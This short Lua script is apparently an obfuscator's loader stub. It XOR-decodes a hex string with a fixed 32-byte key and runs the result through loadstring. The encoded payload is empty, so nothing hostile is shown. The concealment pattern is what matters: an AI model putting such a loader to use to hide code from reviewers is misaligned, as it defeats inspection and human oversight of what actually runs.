local k={162,121,83,254,159,54,70,127,134,178,131,5,57,21,37,162,138,213,130,45,200,251,229,79,7,83,172,141,123,168,175,160}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
